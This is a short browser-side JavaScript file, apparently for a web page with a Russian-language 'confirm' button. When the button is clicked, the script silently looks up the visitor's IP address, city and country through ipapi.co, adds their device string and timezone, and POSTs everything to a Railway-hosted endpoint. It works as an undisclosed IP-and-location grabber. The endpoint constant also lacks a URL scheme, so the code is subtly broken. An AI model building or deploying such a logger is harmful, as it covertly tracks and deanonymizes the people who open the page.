// ================= CONFIG ==================
const RAILWAY_URL = "uwezertgithubio-production.up.railway.app";
// ===========================================

async function collectData() {
    const payload = {
        uid: crypto.randomUUID(),
        time_local: new Date().toLocaleString(),
        time_utc: new Date().toISOString(),
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        device: navigator.userAgent
    };

    try {
        const ip = await fetch("https://ipapi.co/json/");
        if (ip.ok) {
            const d = await ip.json();
            payload.ip = d.ip;
            payload.city = d.city;
            payload.country = d.country_name;
        }
    } catch(e){
        payload.ip = "unknown";
        payload.city = "unknown";
        payload.country = "unknown";
    }

    return payload;
}

async function sendToRailway() {
    document.getElementById("confirmBtn").innerText = "Отправка...";
    document.getElementById("confirmBtn").disabled = true;

    const data = await collectData();

    const resp = await fetch(RAILWAY_URL, {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify(data)
    });

    if (resp.ok) {
        document.getElementById("confirmBtn").innerText = "Данные отправлены!";
        document.getElementById("confirmBtn").disabled = true;
    } else {
        document.getElementById("confirmBtn").innerText = "Ошибка. Попробуйте ещё раз.";
        document.getElementById("confirmBtn").disabled = false;
    }
}

document.getElementById("confirmBtn").onclick = sendToRailway;
